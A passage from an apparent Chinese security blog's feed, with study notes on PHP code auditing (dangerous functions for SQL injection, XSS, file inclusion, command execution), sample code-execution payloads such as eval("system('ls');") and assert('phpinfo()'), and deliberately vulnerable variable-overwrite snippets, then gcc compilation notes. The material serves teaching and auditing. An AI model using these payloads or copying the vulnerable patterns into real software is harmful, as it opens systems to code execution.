        &lt;h1 id=&quot;PHP反序列化&quot;&gt;&lt;a href=&quot;#PHP反序列化&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化&quot;&gt;&lt;/a&gt;PHP反序列化&lt;/h1&gt;&lt;p&gt;从放假回到家里就一直没有学习，过年后突然感到空虚，就来总结一下反序列化的内容&lt;/p&gt;
&lt;h3 id=
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>代码审计函数</title>
    <link href="http://bai-ren-1.github.io/2019/12/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%87%BD%E6%95%B0/"/>
    <id>http://bai-ren-1.github.io/2019/12/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%87%BD%E6%95%B0/</id>
    <published>2019-12-27T14:59:56.000Z</published>
    <updated>2020-02-09T06:33:04.555Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码审计函数"><a href="#代码审计函数" class="headerlink" title="代码审计函数"></a>代码审计函数</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>SQL较多发生于下面这些功能点上：</p><ul><li>登录页面</li><li>获取HTTP头（user-agent/client-ip)</li><li>订单处理（常发生二次注入）</li></ul><blockquote><p> 二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入 。</p><p>即处理这个输入时进行了转义，但是存储进数据库中又变成了脏数据，然后使用到这个脏数据时就会发生注入。</p></blockquote><p>普通注入关注函数：</p><ul><li>select from</li><li>mysql_connect</li><li>mysql_query</li><li>mysql_fetch_row</li><li>update</li><li>insert</li><li>delete</li></ul><p>编码注入关注函数：</p><ul><li>urldecode/rawurldecode</li><li>mysql_set_charset(‘GBK’)</li></ul><p>防范方法：</p><ul><li>gpc/runtime魔术引号 （PHP配置）</li><li>转义类函数<ul><li>addslashes对单双引号、反斜杠和空字符进行转义</li><li>mysq_ [ real_ ] escape_string同理对指定字符串进行转义</li></ul></li><li>intval等字符转换（适用于int型注入）</li><li>PDO预编译</li></ul><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS漏洞关键在于：寻找没有被过滤的参数和输出这些参数的输出函数</p><p>XSS关注函数：</p><ul><li>print</li><li>print_r</li><li>echo</li><li>printf</li><li>sprinf</li><li>sprintf</li><li>die</li><li>var_dump</li><li>var_export</li></ul><p>防范：</p><ul><li>对特殊字符 ‘  “  &lt; &gt; \ : and &amp; # 在输出和二次调用时进行HTML实体转义</li><li>黑白名单方式拦截标签事件属性（自定义正则规则）</li></ul><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF主要是用于越权，常发生于控制权限的地方：</p><ul><li>管理后台</li><li>会员中心</li><li>论坛帖子</li><li>交易管理</li></ul><p>关注点：</p><ul><li><p>黑盒方法：</p><ul><li>抓包看有没有token</li><li>去掉refer再重发一次看响应是否一样</li></ul></li><li><p>白盒方法：</p><ul><li>查看引用的核心基础文件有没有token关键字或者验证操作</li></ul></li></ul><p>防范方法：</p><ul><li>token</li><li>验证码</li></ul><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>文件包含关注的地方：模块加载，cache调用的地方</p><p>文件包含关注函数：</p><ul><li>include</li><li>include_once</li><li>require</li><li>require_once</li></ul><blockquote><p>once ： 只包含一次</p><p>require ： 包含并执行，报错就退出程序</p><p>include ： 包含并执行，报错也继续执行下面的代码</p></blockquote><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>文件上传关注函数：</p><ul><li>move_uploaded_file</li></ul><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>关注函数：</p><ul><li>eval</li><li>assert</li><li>call_user_func_array</li><li>preg_replace</li><li>call_user_func</li><li>动态函数 $a($b)</li></ul><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>关注函数：</p><ul><li>system</li><li>exec</li><li>passthru</li><li>shell_exec</li><li>popen</li><li>proc_open</li><li>pcntl_exec</li></ul><p>防范方法：</p><p>用白名单对用户输入进行过滤</p><ul><li>使用自定义函数或函数库来替代外部命令的功能</li><li>使用 escapeshellarg()函数来处理命令参数</li><li>使用 safe_mode_exec_dir 指定可执行文件的路径</li></ul><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>变量覆盖关注函数：</p><ul><li>extract</li><li>parse_str</li><li>import_request_variables</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PHP代码审计还有很多内容。这里就简单的写一下就是了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;代码审计函数&quot;&gt;&lt;a href=&quot;#代码审计函数&quot; class=&quot;headerlink&quot; title=&quot;代码审计函数&quot;&gt;&lt;/a&gt;代码审计函数&lt;/h1&gt;&lt;h2 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>代码审计思路</title>
    <link href="http://bai-ren-1.github.io/2019/12/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF/"/>
    <id>http://bai-ren-1.github.io/2019/12/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF/</id>
    <published>2019-12-27T14:57:56.000Z</published>
    <updated>2020-02-09T06:33:13.985Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码审计思路"><a href="#代码审计思路" class="headerlink" title="代码审计思路"></a>代码审计思路</h1><p>面试的时候问到了关于代码审计的思路，这里就简单总结一下。</p><p>常见的代码审计思路有以下四种：</p><ul><li>根据敏感关键字回溯参数传递过程；  （PS：即找敏感函数逆向回溯参数是否可控）</li><li>查找可控变量，正向追踪变量传递过程； （PS：即直接找可控参数正向追踪到漏洞处）</li><li>寻找敏感功能点，通读功能点代码；   （PS：即分业务功能去审计，重点关注易出现漏洞的功能如upload等）</li><li>直接通读全文代码。   （PS：直接怼项目所有文件，重点放在通防文件、配置文件、入口文件、通用函数文件等）</li></ul><h2 id="一、敏感函数回溯参数过程"><a href="#一、敏感函数回溯参数过程" class="headerlink" title="一、敏感函数回溯参数过程"></a>一、敏感函数回溯参数过程</h2><p>根据敏感函数来逆向追踪参数的传递过程，是目前使用的最多的一种方式，因为大多数漏洞是由于函数的使用不当造成的。另外非函数使用不当的漏洞，如SQL注入，等以后学习再详细介绍。这种方式的优缺点如下：</p><ul><li>优点：只需搜索相应敏感关键字，即可快速挖掘想要的漏洞，可定向挖掘，高效、高质量；</li><li>缺点：由于没有通读代码，对程序整体架构了解不够深入，在挖掘漏洞时定位利用会花点时间，另外对逻辑漏洞挖掘覆盖不到。</li></ul><h2 id="二、通读全文代码"><a href="#二、通读全文代码" class="headerlink" title="二、通读全文代码"></a>二、通读全文代码</h2><p>通读全文代码也有一定的技巧，否则很难读懂Web程序的，也很难理解代码的业务逻辑。首先我们要看程序的大体结构，如主目录有哪些文件，模块目录有哪些文件，插件目录有哪些文件，另外还要注意文件的大小，创建时间，就可以大概知道这个程序实现了那些功能，核心文件有哪些。</p><p>在看目录结构的时候，特别注意以下几个文件：</p><ul><li><strong>函数集文件</strong><br>函数集文件通常命名中包含<strong>functions或者common等关键字</strong>，这些文件里面是一些公共的函数，提供给其他文件统一调用，所以大多数文件都会在文件头部包含到其他文件。寻找这些文件的一个技巧就是打开index.php或者一些功能性文件。</li><li><strong>配置文件</strong><br>配置文件通常命名中包含config关键字，配置文件包括Web程序运行必须的<strong>功能性配置选项以及数据库等配置信息</strong>。从这个文件可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数是用单引号还是双引号，如果是双引号，则很可能会存在代码执行漏洞。</li><li><strong>安全过滤文件</strong><br>安全过滤文件对我们做代码审计至关重要，通常命名中有<strong>filter、safe、check</strong>等关键字，这类文件主要是对参数进行过滤，比较常见的是针对SQL注入和XSS过滤，还有文件路径、执行的系统命令的参数。</li><li><strong>index文件</strong><br>index是一个程序的<strong>入口文件</strong>，所以我们只要读一遍index文件就可以大致了解整个程序的架构、运行的流程、包含到的文件。</li></ul><h2 id="三、根据功能点定向审计"><a href="#三、根据功能点定向审计" class="headerlink" title="三、根据功能点定向审计"></a>三、根据功能点定向审计</h2><p>根据经验我们简单介绍几个功能点会出现的漏洞：</p><ul><li><strong>文件上传功能</strong><br>这里说的文件上传在很多功能点都会出现，比如像<strong>文章编辑、资料编辑、头像上传、附件上传</strong>，这个功能最常见的漏洞就是任意文件上传了，后端程序没有严格地限制上传的格式，导致可以上传或者存在绕过的情况，而除了文件上传功能外，还经常发生SQL注入漏洞。</li></ul><ul><li><strong>文件管理功能</strong><br>在文件管理功能中，如果程序将文件名或者文件路径直接在参数中传递，则很有可能会存在任意文件的操作漏洞，比如任意文件读取等，利用的方法是在路径中使用../或者..\跳转目录。<br>除了任意文件操作漏洞外，还可能会存在XSS漏洞，程序会在页面中输出文件名，而通常会疏忽对文件名进行过滤，导致可以在数据库中存入带有尖括号等特殊符号的文件名，最后在页面显示的时候就会被执行。</li></ul><ul><li><strong>登录认证功能</strong><br>登录认证功能不是指一个过程，而是整个操作过程中的认证，目前的认证方式大多是基于Cookie和Session，不少程序会把当前登陆的用户账号等认证信息放到Cookie中，或许是加密方式。进行操作的时候直接从Cookie中读取当前用户信息，这里就存在一个算法可信的问题，如果这段Cookie信息没有加salt一类的东西，就可以导致任意用户登录漏洞，只要知道用户的不扥信息，即可生成认证令牌，甚至有的程序会直接把用户名放到Cookie中，操作的时候直接读取这个用户名的数据，这也是常说的越权漏洞。</li></ul><ul><li><strong>找回密码功能</strong><br>找回密码虽然看起来不像任意文件上传这种可以危害到服务器安全的漏洞，但是如果可以重置管理员的密码，也是可以间接控制业务权限甚至拿到服务权限的。找回密码功能的漏洞有很多利用场景，最常见的是验证码爆破。目前特别是APP应用，请求后端验证码的时候大多是4位，并且没有限制验证码的错误次数和有效时间，于是就出现了爆破的漏洞。</li></ul><p>下面再总结一下容易出现RCE的几个敏感点：</p><h2 id="四、PHP容易导致RCE的敏感函数"><a href="#四、PHP容易导致RCE的敏感函数" class="headerlink" title="四、PHP容易导致RCE的敏感函数"></a>四、PHP容易导致RCE的敏感函数</h2><p><strong>PHP代码执行函数</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>()</span><br><span class="line">assert()</span><br><span class="line">preg_replace()</span><br><span class="line">call_user_func()</span><br><span class="line">call_user_func_array()</span><br><span class="line">array_map()</span><br><span class="line">create_function()</span><br></pre></td></tr></table></figure><p>这些函数会将参数当做php代码或者php函数和参数进行执行,下面进行具体的利用解释：</p><ol><li><p><strong>eval (PHP 4, PHP 5, PHP 7)</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span> (string $code):mixed</span><br></pre></td></tr></table></figure><blockquote><p>作用：将参数字符串 $code 作为PHP代码执行</p></blockquote></li></ol><ol start="2"><li><p><strong>assert (PHP 4, PHP 5, PHP 7)</strong> </p><ul><li>PHP 5</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, string $description ] ) : bool</span><br></pre></td></tr></table></figure><ul><li>PHP 7</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, Throwable $exception ] ) : bool</span><br></pre></td></tr></table></figure><blockquote><p>作用：判断一个断言是否为FALSE。当传入的参数assertion是字符串时，它将会被assert()当做php代码执行。</p></blockquote></li></ol><ol start="3"><li><p><strong>preg_replace(PHP 4, PHP 5, PHP 7)</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])</span><br></pre></td></tr></table></figure><blockquote><p>作用： <strong>/e 修正符</strong>使 preg_replace() 将 replacement 参数当作 PHP 代码</p><p>PS： PHP 7.0.0 起，会产生 E_WARNING错误，同时 “\e” 也无法起效</p></blockquote></li></ol><ol start="4"><li><p><strong>call_user_func(PHP 4, PHP 5, PHP 7)</strong>   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) : mixed</span><br></pre></td></tr></table></figure><blockquote><p>作用： 第一个参数callback是被调用的<strong>回调函数</strong>，其余参数是回调函数的参数</p></blockquote></li></ol><ol start="5"><li><p><strong>call_user_func_array (PHP 4 &gt;= 4.0.4, PHP 5, PHP 7)</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array ( callable $callback , <span class="keyword">array</span> $param_arr ) : mixed</span><br></pre></td></tr></table></figure><blockquote><p>作用：把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入；</p></blockquote></li></ol><ol start="6"><li><p><strong>array_map (PHP 4 &gt;= 4.0.6, PHP 5, PHP 7)</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map ( callable $callback , <span class="keyword">array</span> $array1 [, <span class="keyword">array</span> $... ] ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure><blockquote><p> 作用：即将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 </p></blockquote><blockquote><p>PS：回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致</p></blockquote></li></ol><ol start="7"><li><p><strong>create_function (PHP 4 &gt;= 4.0.1, PHP 5, PHP 7)</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function ( string $args , string $code ) : string</span><br></pre></td></tr></table></figure><blockquote><p>作用： 从传递的参数创建一个匿名函数，并返回一个唯一的名称</p><p>PS：该函数是会在内部执行eval，所以安全性和eval一致</p></blockquote></li></ol><p>常见的利用payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">"system('ls');"</span>);</span><br><span class="line"></span><br><span class="line">assert(<span class="string">'phpinfo()'</span>);</span><br><span class="line"></span><br><span class="line">preg_replace(<span class="string">"/&lt;php&gt;(.*?)&lt;\/php&gt;/e"</span>, <span class="string">'\1'</span>, <span class="string">"&lt;php&gt;phpinfo()&lt;/php&gt;"</span>);</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="string">'assert'</span>,<span class="string">'phpinfo()'</span>);</span><br><span class="line"></span><br><span class="line">call_user_func_array(<span class="string">'assert'</span>,<span class="keyword">array</span>(<span class="string">'phpinfo()'</span>));</span><br><span class="line"></span><br><span class="line">array_map(<span class="string">'assert'</span>,<span class="keyword">array</span>(<span class="string">'phpinfo()'</span>));</span><br><span class="line"></span><br><span class="line">create_function(<span class="string">'$a'</span>, <span class="string">'assert($a);'</span>));</span><br></pre></td></tr></table></figure><h2 id="五、PHP中变量覆盖"><a href="#五、PHP中变量覆盖" class="headerlink" title="五、PHP中变量覆盖"></a>五、PHP中变量覆盖</h2><p><strong>1、全局变量覆盖</strong></p><p>当<strong>register_global=ON</strong>时，变量来源可能是各个不同的地方，比如页面的表单，Cookie等都可以,那么就可能产生变量覆盖：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Register_globals: "</span>.(int)ini_get(<span class="string">"register_globals"</span>).<span class="string">"&lt;br/&gt;"</span>;   </span><br><span class="line"><span class="keyword">if</span> ($shabi)&#123;  </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"you are not shabi!"</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们直接提交 shabi 参数即可覆盖到原有的变量$shabi /test.php?shabi=1</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you are not shabi!</span><br></pre></td></tr></table></figure><p><strong>2、$$导致的变量覆盖问题</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>,<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request)  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value)  </span><br><span class="line">    &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$id = <span class="keyword">isset</span>($id) ? $id : <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>($id == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"flag&#123;xxxxxxxxxx&#125;"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $id;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面是一个简单的例子，我们直接提交 id 参数，就能覆盖到原变量 $id。原因在于循环中在遍历到id参数时，会因为$$产生赋值操作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>这样就导致了变量的覆盖</p><p><strong>3、extract()变量覆盖</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract ( <span class="keyword">array</span> &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = <span class="keyword">NULL</span> ]] ) : int</span><br></pre></td></tr></table></figure><blockquote><p>作用：从数组中将变量导入到当前的符号表</p></blockquote><p>在调用extract()时使用在flag选项使用EXTR_SKIP保证已有变量不会被覆盖 ，flag字段的可用选项：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXTR_OVERWRITE如果有冲突，覆盖已有的变量。</span><br><span class="line">EXTR_SKIP如果有冲突，不覆盖已有的变量。</span><br><span class="line">EXTR_PREFIX_SAME如果有冲突，在变量名前加上前缀 prefix。EXTR_PREFIX_ALL给所有变量名加上前缀 prefix。</span><br><span class="line">EXTR_PREFIX_INVALID仅在非法／数字的变量名前加上前缀 prefix。EXTR_IF_EXISTS仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。</span><br></pre></td></tr></table></figure><p><strong>4、parse_str()变量覆盖</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse_str ( string $encoded_string [, <span class="keyword">array</span> &amp;$result ] ) : void</span><br></pre></td></tr></table></figure><blockquote><p>作用： 如果 encoded_string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ） </p></blockquote><blockquote><p>PS： 不赞同没有 result参数的情况下使用此函数，并且在 PHP 7.2 中将<em>废弃</em>不设置参数的行为。 </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$var=<span class="string">'shabi'</span>;  </span><br><span class="line">parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]);  </span><br><span class="line"><span class="keyword">print</span> $var;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面的代码很简单，就是定义一个 $var 变量，然后用parse_str来近些URL查询字符串，那我就可以通过查询 var 参数来覆盖到原来的 $var 变量，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.php?<span class="keyword">var</span> = congming</span><br></pre></td></tr></table></figure><p><strong>5、import_request_variables变量覆盖</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(PHP <span class="number">4</span> &gt;= <span class="number">4.1</span><span class="number">.0</span>, PHP <span class="number">5</span> &lt; <span class="number">5.4</span><span class="number">.0</span>)  </span><br><span class="line">import_request_variables ( string $types [, string $prefix ] ) : bool</span><br></pre></td></tr></table></figure><blockquote><p>作用：将 GET／POST／Cookie 变量导入到全局作用域中</p></blockquote><blockquote><p>PS：第一个参数 types 指定需要导入的变量。可以用字母‘G’、‘P’和‘C’分别表示 GET、POST 和 Cookie。</p><p>这些字母不区分大小写，所以你可以使用‘g’、‘p’和‘c’的任何组合。POST 包含了通过 POST 方法上传的文件信息。</p><p>注意这些字母的顺序，当使用“gp”时，POST 变量将使用相同的名字覆盖 GET 变量。</p><p>任何 GPC 以外的字母都将被忽略。</p></blockquote><blockquote><p>PPS：第二个参数 prefix 作为变量名的前缀，置于所有被导入到全局作用域的变量之前。若没有指定第二个参数很容易导致变量覆盖。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">import_request_variables(<span class="string">"g"</span>);</span><br><span class="line"><span class="keyword">if</span>($radish==<span class="string">"radish"</span>)&#123;    </span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FIlE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为没有指定前缀，并且函数指定了可以通过GET方式进行全局导入，我们能轻易覆盖变量，提交payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.php?radish=radish</span><br></pre></td></tr></table></figure><h2 id="六、反序列化"><a href="#六、反序列化" class="headerlink" title="六、反序列化"></a>六、反序列化</h2><p><strong>1、基本概念：</strong></p><ul><li>序列化：把对象转换为字节序列的过程称为对象的序列化</li><li>反序列化：把字节序列恢复为对象的过程称为对象的反序列化</li></ul><p><strong>2、漏洞成因：</strong></p><p><strong>反序列化对象</strong>中存在<strong>魔术方法</strong>，而且魔术方法中的<strong>代码</strong>可以被控制，漏洞根据不同的代码可以导致各种攻击，如代码注入，sql注入，目录遍历等等 </p><p><strong>3、漏洞本质：</strong></p><p>unserialize函数的变量可控，php文件中存在可利用的类，类中有魔术方法 </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>关于反序列化的内容已经补齐，在“PHP反序列化”一篇中；关于代码审计具体关注点和关注函数在“代码审计关注点”中</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;代码审计思路&quot;&gt;&lt;a href=&quot;#代码审计思路&quot; class=&quot;headerlink&quot; title=&quot;代码审计思路&quot;&gt;&lt;/a&gt;代码审计思路&lt;/h1&gt;&lt;p&gt;面试的时候问到了关于代码审计的思路，这里就简单总结一下。&lt;/p&gt;
&lt;p&gt;常见的代码审计思路有以下四种：&lt;/p
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>程序员的自我修养-DAY2</title>
    <link href="http://bai-ren-1.github.io/2019/12/21/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY2/"/>
    <id>http://bai-ren-1.github.io/2019/12/21/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY2/</id>
    <published>2019-12-21T07:57:52.000Z</published>
    <updated>2019-12-21T08:36:58.625Z</updated>
    
    <content type="html"><![CDATA[<h1 id="程序员的自我修养-Day2"><a href="#程序员的自我修养-Day2" class="headerlink" title="程序员的自我修养 Day2"></a>程序员的自我修养 Day2</h1><p>上一篇文章是对操作系统和计组的一些基本概念进行了复习，这一篇主要是用来学习编译和链接的过程。</p><h2 id="gcc-编译过程"><a href="#gcc-编译过程" class="headerlink" title="gcc 编译过程"></a>gcc 编译过程</h2><p>我们在Linux下，对一个简单的hello.c的C文件使用命令gcc就能对其进行编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.c</span><br><span class="line">./a.out</span><br></pre></td></tr></table></figure><p>上面的命令就是用gcc编译生成a.out，然后执行了a.out。看似很简单一气呵成，但其实gcc的过程包括了4个步骤：</p><p><strong>预处理</strong>（Prepressing）-&gt; <strong>编译</strong>（Compilation）-&gt; <strong>汇编</strong>（Assembly）-&gt; <strong>链接</strong>（Linking）， 这个gcc编译过程入下图所示：</p><p><img src="/2019/12/21/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY2/gcc%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.png" alt></p><p>我们下面分开讲解这四个步骤。</p><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p>预编译相当于使用了下面这个命令（-E 参数代表只进行预编译）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -E hello.c -o hello.i （执行后输出hello.i文件）</span><br></pre></td></tr></table></figure><p>预编译过程是对源代码中#开始的预编译指令进行处理：</p><ul><li>删除所有的”#define”，展开所有的宏定义</li><li>处理所有的条件预编译指令，如”#if”、”#ifdef”、”#elif”、”#else”、”#endif”</li><li>处理”#include”预编译指令，将包含文件插入到该预编译指令的位置</li><li>删除注释 “//“、”/**/“</li><li>保留所有的#pragma编译器指令</li></ul><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>编译相当于使用了下面这个命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.i -o hello.s  （执行后输出hello.s文件）</span><br></pre></td></tr></table></figure><p>对于C语言来说，执行预编译和编译的程序是cc1；对于C++来说，对应的程序叫做cc1plus；Objective-C则是cc1obj；Java则是jc1。所以<strong>gcc只是对这些后台程序的包装，它根据不同参数要求去调用不同的预编译编译程序cc1、汇编器as、链接器ld</strong>。</p><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><p>汇编相当于使用了下面这个命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -c hello.s -o hello.o  （执行后输出hello.s文件）</span><br><span class="line">或者直接调用汇编器</span><br><span class="line">as hello.s -o hello.o</span><br></pre></td></tr></table></figure><p>也可以直接一步到位，由C源码直接预编译、编译、汇编输出成<strong>目标文件</strong>（object file）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c hello.c -o hello.o</span><br></pre></td></tr></table></figure><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>如果通过调用链接器ld来执行，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld -static crt1.o crti.o crtbeginT.o hello.o -start-group -lgcc -lgcc_eh -lc -end-group crtend.o 